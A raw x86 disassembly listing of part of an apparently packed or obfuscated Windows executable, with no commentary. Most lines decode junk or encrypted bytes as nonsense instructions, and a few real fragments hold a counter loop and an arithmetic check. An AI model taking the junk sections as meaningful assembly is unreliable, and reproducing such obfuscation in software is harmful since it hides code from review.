  40614e:	add    ecx,DWORD PTR [ebx+0x1aec6b1b]
  406154:	sahf   
  406155:	fld    TBYTE PTR [esi]
  406157:	xchg   ebp,eax
  406158:	data16 ja 0x40614c
  40615b:	xor    DWORD PTR [ebp+0x7a346b22],edi
  406161:	pop    ecx
  406162:	mov    ch,0x20
  406164:	inc    ebp
  406165:	push   ds
  406166:	stc    
  406167:	repz ffreep st(0)
  40616a:	pusha  
  40616b:	mov    al,0x39
  40616d:	pushf  
  40616e:	inc    eax
  40616f:	jns    0x4061a2
  406171:	ret    
  406172:	rcl    BYTE PTR [eax+0x75fc5ef3],1
  406178:	inc    eax
  406179:	imul   eax,DWORD PTR ds:[edi+0x4206c1dd],0x35ee8c73
  406184:	rol    DWORD PTR [edx-0x20],1
  406187:	out    dx,al
  406188:	jns    0x406143
  40618a:	mov    ds:0x800c2230,al
  40618f:	rcl    ebp,1
  406191:	into   
  406192:	xlat   BYTE PTR ds:[ebx]
  406193:	cmp    al,0xde
  406195:	aas    
  406196:	(bad)  
  406197:	cmp    al,0x69
  406199:	fwait
  40619a:	fwait
  40619b:	and    eax,0x54de3632
  4061a0:	push   0xe08088b6
  4061a5:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4061a6:	xor    cl,bl
  4061a8:	inc    eax
  4061a9:	cmp    BYTE PTR [edi],dh
  4061ab:	jl     0x40622c
  4061ad:	in     al,dx
  4061ae:	mov    ds:0x96d0b4d6,eax
  4061b3:	(bad)  
  4061b4:	jo     0x4061bd
  4061b6:	fldenv [eax]
  4061b8:	cmp    bh,dh
  4061ba:	scas   al,BYTE PTR es:[edi]
  4061bb:	or     ebx,ecx
  4061bd:	push   0xffffff81
  4061bf:	adc    ebx,DWORD PTR [esi-0x1f]
  4061c2:	addr16 jo 0x4061e0
  4061c5:	pusha  
  4061c6:	xchg   DWORD PTR [ebx],edx
  4061c8:	call   0xbf13:0xcaacab2b
  4061cf:	(bad)  
  4061d1:	jnp    0x406208
  4061d3:	(bad)  
  4061d5:	mov    al,ds:0x7c1603cd
  4061da:	jae    0x4061a7
  4061dc:	scas   eax,DWORD PTR es:[edi]
  4061dd:	lock mov dl,0x91
  4061e0:	mov    eax,0x80512af8
  4061e5:	xor    al,0x0
  4061e7:	aaa    
  4061e8:	adc    edi,DWORD PTR ds:0xb835bae5
  4061ee:	test   BYTE PTR [eax+0x68ed3ed3],ah
  4061f4:	push   cs
  4061f5:	jb     0x4061a1
  4061f7:	ret    0x3f81
  4061fa:	or     eax,DWORD PTR [ebx-0x37]
  4061fd:	lea    edx,[esi+0x26]
  406200:	jae    0x406263
  406202:	int    0x6a
  406204:	std    
  406205:	pop    es
  406206:	or     cl,BYTE PTR [eax]
  406208:	rcr    DWORD PTR [eax+eiz*1-0x4d],cl
  40620c:	mov    eax,0xe84a22d4
  406211:	je     0x4061a2
  406213:	or     BYTE PTR [ecx-0x24],cl
  406216:	pop    ecx
  406217:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406218:	push   0x702544a9
  40621d:	dec    ecx
  40621e:	mov    BYTE PTR [edx-0x38],bh
  406221:	popf   
  406222:	or     eax,0xfdb926c8
  406227:	sub    BYTE PTR [eax-0x1a10c3ad],0x6d
  40622e:	sbb    al,0xc9
  406230:	mov    WORD PTR [eax-0x1416cd71],?
  406236:	jnp    0x406241
  406238:	repz add al,0x3f
  40623b:	sub    edx,ecx
  40623d:	out    0x55,al
  40623f:	mov    cl,0x95
  406241:	and    al,0x7f
  406243:	ins    BYTE PTR es:[edi],dx
  406244:	mov    eax,0x242dda36
  406249:	mov    ds:0xd4b04c90,al
  40624e:	fist   DWORD PTR [ebp-0x1a82cb2f]
  406254:	out    0x49,al
  406256:	inc    ecx
  406257:	outs   dx,DWORD PTR ds:[esi]
  406258:	data16 mov ds:0xc9f8cc35,al
  40625e:	xchg   esp,eax
  40625f:	inc    ebp
  406260:	cmp    ecx,DWORD PTR [esi]
  406262:	pop    edx
  406263:	adc    dh,al
  406265:	test   eax,0xe3aacda7
  40626a:	sub    esi,esi
  40626c:	clc    
  40626d:	aaa    
  40626e:	in     eax,dx
  40626f:	mov    esp,0x1c4d2cf2
  406274:	(bad)  
  406276:	(bad)  
  406277:	mov    edi,0x18cf37c2
  40627c:	ins    BYTE PTR es:[edi],dx
  40627d:	dec    ecx
  40627e:	cmp    ebx,esp
  406280:	ds test eax,0xcb1d99c5
  406286:	jne    0x40629f
  406288:	pop    esp
  406289:	data16 cs adc al,0x77
  40628d:	lods   al,BYTE PTR ds:[esi]
  40628e:	xchg   ebx,eax
  40628f:	adc    BYTE PTR [edx],bh
  406291:	pop    ebx
  406292:	jo     0x40625e
  406294:	xlat   BYTE PTR ds:[ebx]
  406295:	scas   al,BYTE PTR es:[edi]
  406296:	test   ebx,ebx
  406298:	xchg   ebp,eax
  406299:	mov    esi,DWORD PTR [ebp-0x8]
  40629c:	xor    eax,edx
  40629e:	xor    esi,edx
  4062a0:	add    eax,ecx
  4062a2:	add    esi,ecx
  4062a4:	imul   eax,esi
  4062a7:	mov    esi,DWORD PTR [ebp+0xc]
  4062aa:	cmp    esi,eax
  4062ac:	mov    eax,DWORD PTR [ebp-0x4]
  4062af:	je     0x405ea6
  4062b5:	xor    eax,edx
  4062b7:	add    eax,ecx
  4062b9:	mov    ecx,DWORD PTR [ebp+0xc]
  4062bc:	imul   eax,ecx
  4062bf:	add    eax,DWORD PTR [ebp+0x8]
  4062c2:	mov    DWORD PTR [ebp+0xc],eax
  4062c5:	mov    eax,DWORD PTR [ebp+0xc]
  4062c8:	pop    esi
  4062c9:	leave  
  4062ca:	ret    0x8
  4062cd:	push   ebp
  4062ce:	mov    ebp,esp
  4062d0:	push   ecx
  4062d1:	mov    DWORD PTR ds:0x43369f,0x7109
  4062db:	jmp    0x406534
  4062e0:	(bad)  
  4062e1:	fwait
  4062e2:	dec    edi
  4062e3:	ds jge 0x4062d0
  4062e6:	push   ecx
  4062e7:	mov    ds:0xe05cf94c,eax
  4062ec:	pop    ebp
  4062ed:	lahf   
  4062ee:	mov    ?,WORD PTR [esp+esi*1+0x3b]
  4062f2:	jl     0x406370
  4062f4:	xor    BYTE PTR [esi+0x7c],bh
  4062f7:	jl     0x4062ad
  4062f9:	std    
  4062fa:	pop    eax
  4062fb:	fxch   st(6)
  4062fd:	push   es
  4062fe:	jo     0x4062dc
  406300:	sbb    edi,esi
  406302:	push   0xffffff96
  406304:	sar    edi,1
  406306:	in     al,dx
  406307:	pop    esi
  406308:	ds inc ebx
  40630a:	mov    dl,BYTE PTR [esi+0x60d2fc84]
  406310:	or     DWORD PTR [edi],0xffffffbc
  406313:	(bad)  [ecx]
  406315:	mov    ebx,0x488052cf
  40631a:	js     0x4062e5
  40631c:	stc    
  40631d:	les    esp,FWORD PTR [edi-0x54]
  406320:	fisttp DWORD PTR [edx]
  406322:	retf   0xcd1f
  406325:	xchg   ecx,eax
  406326:	out    0x92,eax
  406328:	mov    eax,0xf68b3301
  40632d:	push   edi
  40632e:	xchg   edx,eax
  40632f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406330:	rol    DWORD PTR [edi+ecx*2],cl
  406333:	lds    edi,FWORD PTR [ecx+ebp*1]
  406336:	inc    ebx
  406337:	xchg   edx,eax
  406338:	pop    es
  406339:	mov    esi,0xe9a2589b
  40633e:	js     0x4062fe
  406340:	ins    DWORD PTR es:[edi],dx
  406341:	xor    al,0x96
  406343:	jmp    0xed7c:0xd0295988
  40634a:	mov    ds:0x8e269119,eax
  40634f:	loopne 0x406348
  406351:	jle    0x406353
  406353:	add    eax,0x2aba6925
  406358:	pop    ds
  406359:	fidivr DWORD PTR [edi-0x758c9e1b]
  40635f:	sub    bl,BYTE PTR [ecx]
  406361:	cmp    dl,BYTE PTR [ecx-0x63f15d5f]
  406367:	sub    eax,0x68010c91
  40636c:	(bad)  
  40636d:	hlt    
  40636e:	push   edx
  40636f:	inc    bl
  406371:	jg     0x406316
  406373:	jne    0x40636e
  406375:	test   DWORD PTR [ebx+0x48],edx
  406378:	ins    BYTE PTR es:[edi],dx
  406379:	out    0x54,eax
  40637b:	push   esp
  40637c:	xor    al,0x77
  40637e:	ficom  WORD PTR [edx+0x8]
  406381:	add    BYTE PTR [edi],bl
  406383:	mov    cl,0x7
  406385:	inc    ebx
  406386:	loope  0x4063ae
  406388:	and    al,0x11
  40638a:	retf   
  40638b:	or     ah,al
  40638d:	lock cmp BYTE PTR [esi+0x40dbe41f],dh
  406394:	cmp    DWORD PTR [eax+ebx*1-0x4d],eax
  406398:	jbe    0x4063ea
  40639a:	out    dx,eax
  40639b:	mov    WORD PTR [ebp-0x2d],?
  40639e:	fimul  WORD PTR [ecx+0xa]
  4063a1:	dec    eax
  4063a2:	inc    edx
  4063a3:	test   eax,0xccfc7fe2
  4063a8:	hlt    
  4063a9:	mov    ss,WORD PTR [ebx-0x4ab2a730]
  4063af:	dec    ecx
  4063b0:	mov    eax,ds:0xd4661a5c
  4063b5:	icebp  
  4063b6:	sub    DWORD PTR [edi+0x37968d46],ecx
  4063bc:	popa   
  4063bd:	scas   al,BYTE PTR es:[edi]
  4063be:	jb     0x40638a
  4063c0:	mov    ecx,0x5fc695ef
  4063c5:	sub    bh,BYTE PTR [edx-0x35b9a20f]
  4063cb:	mov    ebx,0x559c3cc3
  4063d0:	inc    esp
  4063d1:	mov    esp,0xcc8eab68
  4063d6:	mov    dh,0x2c
  4063d8:	sub    eax,DWORD PTR [eax]
  4063da:	aad    0x8d
  4063dc:	mov    esi,0x6635adc2
  4063e1:	jl     0x4063c5
  4063e3:	test   DWORD PTR [esp+esi*8-0x5e69d90d],0x177f4ddf
  4063ee:	(bad)
  4063f1:	push   es
  4063f2:	or     BYTE PTR [ebx-0x32],0xe8
  4063f6:	jae    0x406469
  4063f8:	xor    cl,0xa3
  4063fb:	xlat   BYTE PTR ds:[ebx]
  4063fc:	mov    ecx,DWORD PTR [eax-0x6a97239d]
  406402:	shl    dl,1
  406404:	mov    dh,0x9
  406406:	sar    BYTE PTR [ebx-0x4a],1
  406409:	(bad)  
  40640a:	dec    ebp
  40640b:	mov    esi,0x1ee3939f
  406410:	mov    edx,0x1b90977f
  406415:	inc    edx
  406416:	push   0x64
  406418:	(bad)  
  40641a:	inc    edi
  40641b:	jmp    0x4063ff
  40641d:	aam    0xcd
  40641f:	add    DWORD PTR [ebx],0x67
  406422:	sub    bl,ch
  406424:	adc    BYTE PTR [ecx-0x4c0caf2a],al
  40642a:	add    edx,0x6a29d047
  406430:	xor    DWORD PTR [edi-0x3a],ebx
  406433:	xchg   BYTE PTR [edi-0x68d8d0f5],bh
  406439:	sahf   
  40643a:	cdq    
  40643b:	inc    eax
  40643c:	adc    ch,BYTE PTR [esi+0x51]
  40643f:	scas   eax,DWORD PTR es:[edi]
  406440:	pusha  
  406441:	jno    0x406419
  406443:	test   BYTE PTR [edx+edi*4-0x4c],bh
  406447:	dec    ebx
  406448:	cmc    
  406449:	mov    dh,0x70
  40644b:	push   edi
  40644c:	lods   al,BYTE PTR ds:[esi]
  40644d:	xor    DWORD PTR [eax],0xffffffcc
  406450:	ins    BYTE PTR es:[edi],dx
  406451:	and    dl,BYTE PTR es:[ecx]
  406454:	sub    eax,0x39c83ab
  406459:	xchg   ebp,eax
  40645a:	inc    edx
  40645b:	xor    cl,BYTE PTR [ecx+0x76]
  40645e:	enter  0x15d4,0xd2
  406462:	xchg   esp,eax
  406463:	sub    dh,dl
  406465:	inc    edx
  406466:	and    dh,BYTE PTR [esi+0x21dafb82]
  40646c:	adc    DWORD PTR [edi+0x5e],eax
  40646f:	popf   
  406470:	xchg   esp,eax
  406471:	stos   BYTE PTR es:[edi],al
  406472:	sti    
  406473:	sahf   
  406474:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  406475:	jmp    0xf140:0xc4805f5
  40647c:	xchg   esi,eax
  40647d:	mov    bh,0x89
  40647f:	pop    ss
  406480:	test   eax,0xe47479ba
  406485:	imul   ebx,ebx,0x42
  406488:	add    DWORD PTR [edx-0x284e9fb4],ecx
  40648e:	mov    ecx,0x924c315
  406493:	add    ebp,DWORD PTR [eax]
  406495:	std    
  406496:	lds    ebx,FWORD PTR [edi]
  406498:	mov    dh,0x7d
  40649a:	adc    eax,0x4c62b1f2
  40649f:	xor    eax,0xad9d5a74
  4064a4:	retf   
  4064a5:	loope  0x406497
  4064a7:	xchg   esp,eax
  4064a8:	add    al,0x89
  4064aa:	mov    al,ds:0xf6d0d3e4
  4064af:	sub    bh,BYTE PTR [eax-0x7698b418]
  4064b5:	paddsb mm5,QWORD PTR [ecx+0x63804203]
  4064bc:	fwait
  4064bd:	sub    dl,BYTE PTR [eax-0x74]
  4064c0:	std    
  4064c1:	xchg   edi,eax
  4064c2:	jmp    0xa81119bd
  4064c7:	enter  0xae9b,0x3b
  4064cb:	std    
  4064cc:	dec    edi
  4064cd:	lods   eax,DWORD PTR ds:[esi]
  4064ce:	into   
  4064cf:	lea    ecx,[ecx-0x3f]
  4064d2:	test   al,0x13
  4064d4:	fs cmc 
  4064d6:	hlt    
  4064d7:	sub    DWORD PTR [ebp+0x58],ebx
  4064da:	and    BYTE PTR [ecx-0x71ef11a8],ch
  4064e0:	stos   BYTE PTR es:[edi],al
  4064e1:	shr    DWORD PTR [ebp+0x25],1
  4064e4:	push   ecx
  4064e5:	retf   0x233b
  4064e8:	cld    
  4064e9:	jmp    0x4064b0
  4064eb:	ffreep st(2)
  4064ed:	test   eax,0xcd952534
  4064f2:	sub    BYTE PTR [esp+esi*4],cl
  4064f5:	cld    
  4064f6:	lock loop 0x4064d0
  4064f9:	mov    edi,eax
  4064fb:	or     ch,cl
  4064fd:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  4064fe:	push   ebp
  4064ff:	shr    DWORD PTR [ecx+edi*1+0x4a],1
  406503:	mov    ecx,0x82663e6e
  406508:	push   ecx
  406509:	lock jns 0x40649c
  40650c:	clc    
  40650d:	fstp   QWORD PTR [edx-0x27]
  406510:	push   ebp
  406511:	inc    ebp
  406512:	stos   BYTE PTR es:[edi],al
  406513:	mov    eax,ds:0x27e0c77d
  406518:	outs   dx,BYTE PTR ds:[esi]
  406519:	adc    edi,ebx
  40651b:	mov    al,ds:0x159e8fc7
  406520:	mov    WORD PTR [ecx-0x1762a24e],cs
  406526:	fs pop es
  406528:	jne    0x4064f1
  40652a:	sbb    cl,0x5b
  40652d:	imul   edi,DWORD PTR [ebx+esi*2+0x3479c633],0x51
  406535:	mov    eax,0x4881
  40653a:	mov    eax,0x5a3fc9e
  40653f:	mov    DWORD PTR [ebp-0x4],eax
  406542:	mov    ecx,DWORD PTR [ebp-0x4]
  406545:	mov    DWORD PTR ds:0x4336a7,0x6d12
  40654f:	mov    DWORD PTR [ebp-0x8],0x4ec5
  406556:	mov    DWORD PTR ds:0x43375f,0x756c
  406560:	cmp    ecx,eax
  406562:	mov    DWORD PTR ds:0x43365b,0x510c
  40656c:	jne    0x406d16
  406572:	mov    ax,WORD PTR [ebp-0x8]
  406576:	and    DWORD PTR ds:0x4336df,0x0
  406580:	mov    ecx,DWORD PTR ds:0x4336df
  406586:	inc    ecx
  406587:	mov    DWORD PTR ds:0x4336df,ecx
  40658d:	cmp    DWORD PTR ds:0x4336df,0x9
  406594:	jne    0x4065a5
  40659a:	push   0x3195
  40659f:	call   DWORD PTR ds:0x4120c0
  4065a5:	cmp    DWORD PTR ds:0x4336df,0x8
  4065ac:	jne    0x4065bf
  4065b2:	mov    ecx,DWORD PTR ds:0x4336df
  4065b8:	inc    ecx
  4065b9:	mov    DWORD PTR ds:0x4336df,ecx
  4065bf:	cmp    DWORD PTR ds:0x4336df,0x11
  4065c6:	jb     0x406580
  4065cc:	jmp    0x406825
  4065d1:	fld    st(1)
  4065d3:	addr16 into 
  4065d5:	outs   dx,BYTE PTR ds:[si]
  4065d7:	jno    0x4065ca
  4065d9:	add    eax,0xff95211a
  4065de:	cmp    eax,0xc5e8ff0b
  4065e3:	jl     0x406661
  4065e5:	xor    BYTE PTR [esi+0x7c],bh
  4065e8:	jl     0x4065ab
  4065ea:	push   0xffffff94
  4065ec:	push   es
  4065ed:	rol    BYTE PTR [ebx],0x7
  4065f0:	jb     0x406616
  4065f2:	push   es
  4065f3:	retf   
  4065f4:	xor    BYTE PTR [eax+ecx*8-0x5d],dh
  4065f8:	xchg   esp,eax
  4065f9:	fidivr DWORD PTR ds:0x139022e0
  4065ff:	add    bh,bl
  406601:	(bad)  [esi+0x68]
  406604:	push   0x38a7d26e
  406609:	mov    al,ds:0x8b9678c3
  40660e:	lods   eax,DWORD PTR ds:[esi]
  40660f:	cli    
  406610:	mov    WORD PTR [eax-0x1127cd08],fs
  406616:	push   ds
  406617:	mov    al,ds:0xe73f2e2d
  40661c:	fisttp WORD PTR [esi]
  40661e:	mov    BYTE PTR [esi+0x8122fb],ch
  406624:	je     0x4065b4
  406626:	push   esi
  406627:	cmp    BYTE PTR [edx+0x2b],0xab
  40662b:	nop
  40662c:	dec    ebp
  40662d:	ret    0x229b
  406630:	pop    ebp
  406631:	mov    ecx,0x9e87b605
  406636:	inc    ecx
  406637:	fs ret 0x9fdc
  40663b:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40663c:	outs   dx,DWORD PTR ds:[esi]
  40663d:	push   ss
  40663e:	shl    BYTE PTR [esi-0x25],0x47
  406642:	push   es
  406643:	in     al,0x6
  406645:	dec    esp
  406646:	(bad)  
  406647:	(bad)  
  406648:	xchg   ebx,eax
  406649:	aam    0x66
  40664b:	sub    esp,eax
  40664d:	xchg   ecx,eax
  40664e:	popf   
  40664f:	adc    BYTE PTR [edi+0x1aec0ee7],0x3d
  406656:	adc    BYTE PTR [eax+ebx*8-0x249fedf2],0xa8
  40665e:	jno    0x4065e7
  406660:	stos   DWORD PTR es:[edi],eax
  406661:	mov    ecx,DWORD PTR [edx+0x51]
  406664:	mov    ah,0xf3
  406666:	mov    esp,0x63b4a6c
  40666b:	mov    dl,0xec
  40666d:	loopne 0x4066a0
  40666f:	retfw  
  406671:	jnp    0x4066d9
  406673:	sub    BYTE PTR es:[edi+0x54],ch
  406677:	or     eax,DWORD PTR [edi+eax*4]
  40667a:	mov    al,0xb2
  40667c:	add    ah,ch
  40667e:	cdq    
  40667f:	outs   dx,BYTE PTR ds:[esi]
  406680:	or     eax,0xaf53d76c
  406685:	add    ch,BYTE PTR [ebx-0xa]
  406688:	push   ecx
  406689:	ins    BYTE PTR es:[edi],dx
  40668a:	call   0x6937:0x985b572b
  406691:	ins    BYTE PTR es:[edi],dx
  406692:	std    
  406693:	lahf   
  406694:	jp     0x40663a
  406696:	cmp    DWORD PTR [eax+0x7a],eax
  406699:	cmp    DWORD PTR [ecx+0x5d85d652],0x5499d0e8
  4066a3:	or     edi,esi
  4066a5:	mov    eax,ds:0xb7806f2d
  4066aa:	mov    ebx,0x5ada9902
  4066af:	das    
  4066b0:	(bad)  
  4066b1:	in     eax,dx
  4066b2:	mov    al,0x3d
  4066b4:	pop    es
  4066b5:	jmp    0xefd2279c
  4066ba:	xchg   DWORD PTR [ebx],esi
  4066bc:	addr16 push 0x7945c496
  4066c2:	dec    edx
  4066c3:	dec    esi
  4066c4:	add    al,ch
  4066c6:	ret    
  4066c7:	call   DWORD PTR [edi+ebx*2-0x32463e97]
  4066ce:	int    0xdd
  4066d0:	push   esi
  4066d1:	mov    ch,BYTE PTR [esi-0x12]
  4066d4:	cdq    
  4066d5:	mov    cl,0x65
  4066d7:	pop    ecx
  4066d8:	and    DWORD PTR [ecx+0x12],0x53
  4066dc:	mov    esp,0x5ac01b1c
  4066e1:	ret    
  4066e2:	mov    ecx,0x3690a2be
  4066e7:	xor    edx,0x30f61ff0
  4066ed:	and    DWORD PTR [edi+0x1b],0xacc663cf
  4066f4:	rol    bh,1
  4066f6:	les    edx,FWORD PTR [esi-0x5468f877]
  4066fc:	int3   
  4066fd:	mov    ch,0xaf
  4066ff:	mov    ebx,ecx
  406701:	mov    esp,DWORD PTR [edi]
  406703:	sbb    al,0x50
  406705:	cmp    DWORD PTR [edi+ecx*4-0x787098d9],0x745d6af0
  406710:	popf   
  406711:	shr    BYTE PTR [ebx+0x4f11b889],0x5
  406718:	xchg   esi,eax
  406719:	push   eax
  40671a:	mov    dl,0x72
  40671c:	adc    eax,0x5171c20c
  406721:	neg    DWORD PTR [esi+0x2c]
  406724:	dec    ecx
  406725:	mov    bh,0xe8
  406727:	jmp    0x34b:0xa85f29f0
  40672e:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40672f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406730:	outs   dx,DWORD PTR ds:[esi]
  406731:	popf   
  406732:	sbb    BYTE PTR [ecx],0x1f
  406735:	retf   0x497f
  406738:	pop    ss
  406739:	push   cs
  40673a:	test   bl,ah
  40673c:	aas    
  40673d:	mov    dl,0x39
  40673f:	arpl   WORD PTR [ebx+0x7da72a08],si
  406745:	arpl   WORD PTR [edi+0x1642d0ff],bx
  40674b:	push   ebx
  40674c:	adc    BYTE PTR [ebx-0x1d],cl
  40674f:	xchg   edx,eax
  406750:	and    cl,BYTE PTR [edx]
  406752:	(bad)
  406755:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406756:	xor    DWORD PTR [ecx],edi
  406758:	mov    DWORD PTR ds:0x8fbb096e,edx
  40675e:	push   ds
  40675f:	jo     0x406781
  406761:	gs pop eax
  406763:	shr    eax,0x58
  406766:	jge    0x406783
  406768:	cmp    eax,0xe35b40d6
  40676d:	mov    ebx,0xe8e6f090
  406772:	cmp    BYTE PTR [esi+0x74],dl
  406775:	adc    eax,0xb61edeb4
  40677a:	das    
  40677b:	out    0x74,al
  40677d:	pop    ebx
  40677e:	mov    cs,WORD PTR [eax]
  406780:	xchg   esi,eax
  406781:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406783:	imul   edx,esp,0xffffffb7
  406786:	ja     0x40675b
  406788:	lock cmp edi,DWORD PTR es:[ecx-0x1853324a]
  406790:	pusha  
  406791:	xlat   BYTE PTR ds:[ebx]
  406792:	stc    
  406793:	lods   eax,DWORD PTR ds:[esi]
  406794:	dec    edx
  406795:	inc    ebp
  406796:	fistp  DWORD PTR [ebx]
  406798:	xchg   DWORD PTR [ecx-0x23],edi
  40679b:	or     ebp,DWORD PTR [ebx-0x4365f628]
  4067a1:	cli    
  4067a2:	push   cs
  4067a3:	jbe    0x40672d
  4067a5:	dec    esi
  4067a6:	or     DWORD PTR [ecx-0x52],ebx
  4067a9:	repz xchg edi,eax
  4067ab:	clc    
  4067ac:	movhps QWORD PTR [ecx],xmm0
  4067af:	test   al,0xb7
  4067b1:	in     eax,dx
  4067b2:	xor    al,0xc7
  4067b4:	xor    eax,0x5522f3d9
  4067b9:	mov    ebx,0x7f713a4
  4067be:	iret   
  4067bf:	or     ah,BYTE PTR [esi-0x4dbffc6d]
  4067c5:	mov    cs,esi
  4067c7:	idiv   BYTE PTR [ecx+eiz*8]
  4067ca:	pusha  
  4067cb:	test   eax,0x7cb520f6
  4067d0:	or     dh,BYTE PTR [esi-0x51]
  4067d3:	xchg   edx,eax
  4067d4:	arpl   WORD PTR [edi],cx
  4067d6:	dec    esi
  4067d7:	xor    ebx,esp
  4067d9:	ss sub ch,bh
  4067dc:	or     BYTE PTR [ecx+esi*2+0x69],dl
  4067e0:	xchg   esi,eax
  4067e1:	dec    ebx
  4067e2:	and    eax,0xf93db8a3
  4067e7:	mov    cl,0x40
  4067e9:	cwde   
  4067ea:	cmc    
  4067eb:	sub    edi,DWORD PTR [edi+0x859f9af]
  4067f1:	inc    eax
  4067f2:	cdq    
  4067f3:	repnz fadd DWORD PTR [ecx-0x567e8268]
  4067fa:	pushf  
  4067fb:	push   es
  4067fc:	mov    al,0x73
  4067fe:	xor    DWORD PTR [edx+0x6c],ebx
  406801:	rol    BYTE PTR [ebp+0x26],0xeb
  406805:	cwde   
  406806:	mov    bl,0x15
  406808:	push   edx
  406809:	out    0x6b,al
  40680b:	out    0x74,al
  40680d:	daa    
  40680e:	fs sti 
  406810:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406811:	mov    dl,0x36
  406813:	mov    bl,0x82
  406815:	mov    DWORD PTR [ebp+0x135a0ee],esi
  40681b:	ror    DWORD PTR [edi+0x8edc901],1
  406821:	ins    BYTE PTR es:[edi],dx
  406822:	dec    ebp
  406823:	mov    esp,0x8a3ab9bb
  406828:	add    BYTE PTR [eax],al
  40682a:	jmp    0x406a83
  40682f:	or     ah,cl
  406831:	mov    ah,0x1f
  406833:	jo     0x40689c
  406835:	xchg   ebx,eax
  406836:	jmp    0x406845
  406838:	push   ss
  406839:	test   eax,0xb90273cb
  40683e:	mov    bl,0xac
  406840:	(bad)  
  406841:	jl     0x4068bf
  406843:	xor    BYTE PTR [esi+0x7c],bh
  406846:	jl     0x406886
  406848:	jge    0x40689f
  40684a:	popa   
  40684b:	ror    BYTE PTR ds:[edx],cl
  40684e:	dec    edx
  40684f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406850:	dec    ebx
  406851:	out    0x4a,eax
  406853:	adc    ah,BYTE PTR [eax+0x2a]
  406856:	aaa    
  406857:	sbb    DWORD PTR [eax+0x4517d9a5],edi
  40685d:	push   ds
  40685e:	test   esp,ebx
  406860:	aad    0x7a
  406862:	lds    esp,FWORD PTR [edi+0x59]
  406865:	pop    esp
  406866:	ret    0xc99e
  406869:	aas    
  40686a:	pop    esp
  40686b:	call   0x8d0c1102
  406870:	cmc    
  406871:	or     DWORD PTR [edx-0x54dd5241],edi
  406877:	test   BYTE PTR [edx+edi*4-0x1a4c2e84],cl
  40687e:	repnz add dh,BYTE PTR [ecx-0x13445ef3]
  406885:	mov    es,ecx
  406887:	add    BYTE PTR [ebp+0x14bf87de],0x43
  40688e:	in     eax,dx
  40688f:	repz or BYTE PTR [ecx-0x23],ch
  406893:	sbb    dl,BYTE PTR [eax]
  406895:	dec    edi
  406896:	push   ebx
  406897:	inc    esp
  406898:	jb     0x406858
  40689a:	lods   eax,DWORD PTR ds:[esi]
  40689b:	sahf   
  40689c:	out    dx,eax
  40689d:	loop   0x40682f
  40689f:	adc    al,0xdc
  4068a1:	dec    edx
  4068a2:	ror    DWORD PTR [ebx],cl
  4068a4:	mov    ds:0xe859c8f1,al
  4068a9:	push   eax
  4068aa:	push   ss
  4068ab:	iret   
  4068ac:	repnz hlt 
  4068ae:	mov    ah,0xa7
  4068b0:	xlat   BYTE PTR ds:[ebx]
  4068b1:	ins    BYTE PTR es:[edi],dx
  4068b2:	out    0x62,al
  4068b4:	fsubr  DWORD PTR [edx+0x66439fbe]
  4068ba:	add    DWORD PTR [eax-0x33],edx
  4068bd:	dec    ebp
  4068be:	dec    esp
  4068bf:	iret   
  4068c0:	imul   esi,DWORD PTR [edi+0x56d0bec1],0xffffffd2
  4068c7:	adc    dl,BYTE PTR [esi-0x5c2b5bb]
  4068cd:	mov    ?,WORD PTR [edx-0x1b]
  4068d0:	pop    ebx
  4068d1:	retf   
  4068d2:	dec    edx
  4068d3:	cmp    ebx,DWORD PTR [ebx]
  4068d5:	and    DWORD PTR [ecx+0x65345aae],ecx
  4068db:	js     0x406943
  4068dd:	std    
  4068de:	mov    ah,0xa1
  4068e0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4068e1:	inc    ebx
  4068e2:	bound  ebx,QWORD PTR [ecx]
  4068e4:	inc    ebx
  4068e5:	jp     0x4068b3
  4068e7:	xchg   esp,eax
  4068e8:	ja     0x4068fd
  4068ea:	pop    es
  4068eb:	adc    DWORD PTR [ecx-0x71e7de4f],edx
  4068f1:	pop    ebp
  4068f2:	dec    BYTE PTR [ebp+0x56a5cb8]
  4068f8:	fdivr  QWORD PTR [eax-0x56]
  4068fb:	mov    ebp,0xe8b9a7d0
  406900:	(bad)  
  406901:	xchg   esp,eax
  406902:	jle    0x4068de
  406904:	add    esi,DWORD PTR [edx-0x6c29704c]
  40690a:	rcl    DWORD PTR ds:0xe4fa4b71,cl
  406910:	or     al,0x4e
  406912:	xor    DWORD PTR [ecx+ecx*1+0x29],esp
  406916:	bound  ebx,QWORD PTR [edx+0x372dc7d2]
  40691c:	jo     0x406939
  40691e:	dec    esi
  40691f:	fmul   DWORD PTR [edx+0x4644147e]
  406925:	push   eax
  406926:	adc    al,0x5e
  406928:	fst    DWORD PTR [ebp-0x38]
  40692b:	sahf   
  40692c:	jno    0x4068f5
  40692e:	popf   
  40692f:	fs dec ecx
  406931:	mov    bl,0xf0
  406933:	mov    eax,0x9ff1d1bb
  406938:	sub    dh,BYTE PTR [esi*1+0x4b39e491]
  40693f:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  406940:	rol    BYTE PTR [esi],0xbf
  406943:	(bad)  
  406944:	popf   
  406945:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  406946:	icebp  
  406947:	dec    esi
  406948:	xlat   BYTE PTR ds:[ebx]
  406949:	div    BYTE PTR [ebx+0x25]
  40694c:	faddp  st(0),st
  40694e:	in     al,0x8a
  406950:	das    
  406951:	or     cl,0xdb
  406954:	push   edi
  406955:	gs xchg edi,eax
  406957:	lods   eax,DWORD PTR ds:[esi]
  406958:	mov    ds:0x10348d93,al
  40695d:	jnp    0x4068f5
  40695f:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  406960:	sbb    eax,0xf9f495ec
  406965:	jnp    0x406926
  406967:	cmp    eax,0x12b8f8f0
  40696c:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40696d:	jmp    0x4069c6
